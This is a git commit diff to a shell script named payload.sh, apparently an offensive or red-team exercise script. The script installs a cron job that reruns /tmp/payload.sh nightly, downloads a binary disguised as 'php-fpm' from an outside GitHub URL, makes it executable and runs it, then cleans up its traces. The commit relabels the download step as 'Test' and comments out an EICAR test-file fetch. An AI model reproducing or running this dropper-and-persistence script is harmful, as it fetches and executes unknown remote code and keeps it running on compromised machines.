aae0e9bdc06981efed59729c9aa1a064e9068399
b4ldrrr <artelia.yeve@gmail.com>
2024-06-25 15:06:50 +0200

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -6,11 +6,11 @@ crontab -l > mycron
 echo "0 0 * * * /tmp/payload.sh" >> mycron
 crontab mycron
 
-#Reconnaissance
+#Test
 wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/php-fpm'; chmod 777 ./php-fpm; ./php-fpm
 
 #Téléchargement charge malveillante
-wget 'https://secure.eicar.org/eicar_com.zip'
+#wget 'https://secure.eicar.org/eicar_com.zip'
 
 #Nettoyage
 rm mycron
